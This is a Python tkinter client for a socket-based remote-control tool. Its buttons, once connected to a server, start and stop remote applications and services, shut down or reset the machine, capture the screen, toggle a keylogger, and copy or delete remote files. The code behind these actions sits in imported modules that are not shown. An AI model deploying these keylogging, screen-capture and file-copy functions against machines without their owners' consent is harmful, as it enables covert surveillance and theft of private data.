import socket
import tkinter as tk
from tkinter import messagebox, simpledialog
from delete_copy_paste import copy_file_from_server, delete_file_from_server
from shutdown_reset import reset_server, shutdown_server
from screen_capturing import screen_capturing
from list_start_stop_app import list_start_stop_app
from list_start_stop_service import list_start_stop_service
from key_logger import toggle_key_logger


class ClientApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Client GUI")
        self.master.geometry("400x400")

        self.server_ip = None
        self.port = None
        self.client_socket = None

        # IP and Port Entry
        self.create_widgets()

    def create_widgets(self):
        self.ip_label = tk.Label(self.master, text="Enter Server IP:")
        self.ip_label.pack(pady=5)
        self.ip_entry = tk.Entry(self.master)
        self.ip_entry.pack(pady=5)

        self.port_label = tk.Label(self.master, text="Enter Server Port:")
        self.port_label.pack(pady=5)
        self.port_entry = tk.Entry(self.master)
        self.port_entry.pack(pady=5)

        self.connect_button = tk.Button(self.master, text="Connect", command=self.connect_to_server)
        self.connect_button.pack(pady=10)

        # Menu Buttons (hidden until connected)
        self.menu_buttons = {
            "Application Processing": self.list_start_stop_app,
            "Service Processing": self.list_start_stop_service,
            "Shutdown Server": self.shutdown_server,
            "Reset Server": self.reset_server,
            "Screen Capture": self.screen_capturing,
            "Start Keylogger": self.toggle_key_logger,
            "Delete File from Server": self.delete_file_from_server,
            "Copy File from Server": self.copy_file_from_server
        }

        self.buttons = {}
        for text, command in self.menu_buttons.items():
            button = tk.Button(self.master, text=text, command=command, state=tk.DISABLED)
            button.pack(pady=5)
            self.buttons[text] = button

        self.exit_button = tk.Button(self.master, text="Exit", command=self.exit_program)
        self.exit_button.pack(pady=10)

    def connect_to_server(self):
        server_ip = self.ip_entry.get()
        try:
            port = int(self.port_entry.get())
        except ValueError:
            messagebox.showerror("Error", "Port must be a number.")
            return

        if not self.is_valid_ip_address(server_ip):
            messagebox.showerror("Error", "Invalid IP address. Please try again.")
            return

        if not self.is_valid_port(port):
            messagebox.showerror("Error", "Port must be between 1 and 65535.")
            return

        self.client_socket = self.create_socket_connection(server_ip, port)
        if self.client_socket:
            messagebox.showinfo("Success", "Connected to the server successfully!")
            self.enable_buttons()

    def create_socket_connection(self, server_ip, port):
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, port))
            return client_socket
        except socket.error as e:
            messagebox.showerror("Error", f"Connection failed: {e}")
            return None

    def enable_buttons(self):
        for button in self.buttons.values():
            button.config(state=tk.NORMAL)

    def is_valid_ip_address(self, ip):
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

    def is_valid_port(self, port):
        return 0 < port <= 65535

    def list_start_stop_app(self):
        list_start_stop_app(self.client_socket)

    def list_start_stop_service(self):
        list_start_stop_service(self.client_socket)

    def shutdown_server(self):
        self.confirm_action("Shutdown", "Are you sure you want to shutdown the server?", shutdown_server)

    def reset_server(self):
        self.confirm_action("Reset", "Are you sure you want to reset the server?", reset_server)

    def confirm_action(self, action, message, action_method):
        confirmation = messagebox.askquestion(action, message)
        if confirmation == 'yes':
            action_method(self.client_socket)

    def screen_capturing(self):
        screen_capturing(self.client_socket)

    def toggle_key_logger(self):
        toggle_key_logger(self.client_socket)

    def delete_file_from_server(self):
        file_path = self.ask_for_file_path("Enter the full path of the file to delete on server: ")
        delete_file_from_server(self.client_socket, file_path)

    def copy_file_from_server(self):
        copy_file_from_server(self.client_socket)

    def ask_for_file_path(self, prompt):
        return simpledialog.askstring("File Path", prompt)

    def exit_program(self):
        if self.client_socket:
            self.client_socket.close()
        self.master.quit()


if __name__ == "__main__":
    root = tk.Tk()
    app = ClientApp(root)
    root.mainloop()
